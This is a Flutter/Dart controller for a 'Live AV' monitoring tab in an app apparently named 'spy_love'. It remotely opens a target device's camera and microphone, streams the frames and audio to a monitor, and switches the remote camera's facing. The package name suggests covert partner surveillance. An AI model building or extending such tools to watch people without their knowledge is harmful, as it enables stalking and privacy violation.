import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:spy_love/core/network/media_stream_client.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_session.dart';

enum LiveAvStatus { idle, requesting, connecting, waiting, live, ended, error }

/// Monitor-side controller for the Live AV tab.
class LiveAvController extends ChangeNotifier {
  LiveAvController(this._repo, this._stream);

  final LiveMediaRepository _repo;
  final MediaStreamClient _stream;

  LiveAvStatus _status = LiveAvStatus.idle;
  Uint8List? _frame;
  String? _error;
  LiveMediaSession? _session;
  String _facing = 'back';
  bool _micEnabled = false;
  bool _cameraEnabled = true;
  int _frameCount = 0;
  int _audioChunks = 0;
  DateTime? _lastMediaAt;
  bool _slowWait = false;
  bool _switching = false;
  bool _wasStale = false;
  Timer? _waitTimer;
  Timer? _staleTimer;
  Timer? _switchTimer;

  // Latest PCM for optional playback (viewer plays via native later / skip).
  Uint8List? _lastPcm;
  int _pcmSampleRate = 16000;

  LiveAvStatus get status => _status;
  Uint8List? get frame => _frame;
  String? get error => _error;
  String get facing => _facing;
  bool get micEnabled => _micEnabled;
  bool get cameraEnabled => _cameraEnabled;
  int get frameCount => _frameCount;
  int get audioChunks => _audioChunks;
  Uint8List? get lastPcm => _lastPcm;
  int get pcmSampleRate => _pcmSampleRate;
  bool get slowWait => _slowWait;
  bool get isSwitching => _switching;
  bool get isStreaming =>
      _status == LiveAvStatus.live ||
      _status == LiveAvStatus.connecting ||
      _status == LiveAvStatus.waiting;

  bool get isStale {
    if (_status != LiveAvStatus.live) return false;
    final last = _lastMediaAt;
    if (last == null) return false;
    return DateTime.now().difference(last) > const Duration(seconds: 5);
  }

  Future<void> start(
    String deviceId, {
    bool camera = true,
    bool mic = false,
    String facing = 'back',
  }) async {
    if (isStreaming) return;
    _cameraEnabled = camera;
    _micEnabled = mic;
    _facing = facing;
    _frame = null;
    _lastPcm = null;
    _frameCount = 0;
    _audioChunks = 0;
    _lastMediaAt = null;
    _slowWait = false;
    _switching = false;
    _wasStale = false;
    _setStatus(LiveAvStatus.requesting);
    _error = null;

    final kind = camera && mic
        ? 'both'
        : mic
        ? 'microphone'
        : 'camera';

    final requested = await _repo.requestSession(
      deviceId,
      mediaKind: kind,
      cameraFacing: facing,
    );
    if (requested.isRight) {
      _error = requested.right;
      _setStatus(LiveAvStatus.error);
      return;
    }
    _session = requested.left;
    _setStatus(LiveAvStatus.connecting);

    final connected = await _stream.connect(
      _session!.wsPath,
      onFrame: (message) {
        final bytes = MediaStreamClient.decodeJpeg(message);
        if (bytes == null) return;
        _frame = Uint8List.fromList(bytes);
        _frameCount++;
        _lastMediaAt = DateTime.now();
        _slowWait = false;
        _switching = false;
        _waitTimer?.cancel();
        _switchTimer?.cancel();
        if (_status != LiveAvStatus.live) _status = LiveAvStatus.live;
        _ensureStaleTicker();
        notifyListeners();
      },
      onAudio: (message) {
        final bytes = MediaStreamClient.decodePcm(message);
        if (bytes == null) return;
        _lastPcm = Uint8List.fromList(bytes);
        final data = message['data'];
        if (data is Map) {
          _pcmSampleRate = (data['sampleRate'] as num?)?.toInt() ?? 16000;
        }
        _audioChunks++;
        _lastMediaAt = DateTime.now();
        _slowWait = false;
        _waitTimer?.cancel();
        if (_status != LiveAvStatus.live) _status = LiveAvStatus.live;
        _ensureStaleTicker();
        notifyListeners();
      },
      onSignal: (message) {
        final data = message['data'];
        final signal = data is Map ? data['signal'] : message['signal'];
        if (signal == 'ended' || signal == 'paused') {
          _setStatus(LiveAvStatus.ended);
        }
      },
      onClosed: () {
        if (_status != LiveAvStatus.ended && _status != LiveAvStatus.error) {
          _setStatus(LiveAvStatus.ended);
        }
      },
    );

    if (!connected) {
      _error = 'Could not open the live AV stream.';
      _setStatus(LiveAvStatus.error);
      return;
    }
    if (_status == LiveAvStatus.connecting ||
        _status == LiveAvStatus.requesting) {
      _setStatus(LiveAvStatus.waiting);
    }
    _armWaitTimer();
  }

  Future<void> switchFacing() async {
    final session = _session;
    if (session == null || !isStreaming || _switching) return;
    final next = _facing == 'front' ? 'back' : 'front';
    _switching = true;
    notifyListeners();
    final result = await _repo.setFacing(session.id, next);
    if (result.isLeft) {
      _facing = next;
      _switchTimer?.cancel();
      _switchTimer = Timer(const Duration(seconds: 4), () {
        if (_switching) {
          _switching = false;
          notifyListeners();
        }
      });
      notifyListeners();
      return;
    }
    _switching = false;
    notifyListeners();
  }

  Future<void> stop() async {
    final session = _session;
    _waitTimer?.cancel();
    _staleTimer?.cancel();
    _switchTimer?.cancel();
    await _stream.close();
    if (session != null) {
      await _repo.endSession(session.id, reason: 'monitor_stopped');
    }
    _session = null;
    _frame = null;
    _lastPcm = null;
    _switching = false;
    _setStatus(LiveAvStatus.ended);
  }

  void _armWaitTimer() {
    _waitTimer?.cancel();
    _waitTimer = Timer(const Duration(seconds: 25), () {
      if (_status == LiveAvStatus.connecting ||
          _status == LiveAvStatus.waiting) {
        _slowWait = true;
        notifyListeners();
      }
    });
  }

  void _ensureStaleTicker() {
    _staleTimer ??= Timer.periodic(const Duration(seconds: 1), (_) {
      if (_status != LiveAvStatus.live) return;
      final stale = isStale;
      if (stale != _wasStale) {
        _wasStale = stale;
        notifyListeners();
      }
    });
  }

  void _setStatus(LiveAvStatus status) {
    _status = status;
    if (status != LiveAvStatus.live &&
        status != LiveAvStatus.waiting &&
        status != LiveAvStatus.connecting) {
      _waitTimer?.cancel();
      _staleTimer?.cancel();
      _staleTimer = null;
      _switchTimer?.cancel();
    }
    notifyListeners();
  }

  @override
  void dispose() {
    _waitTimer?.cancel();
    _staleTimer?.cancel();
    _switchTimer?.cancel();
    unawaited(_stream.close());
    super.dispose();
  }
}
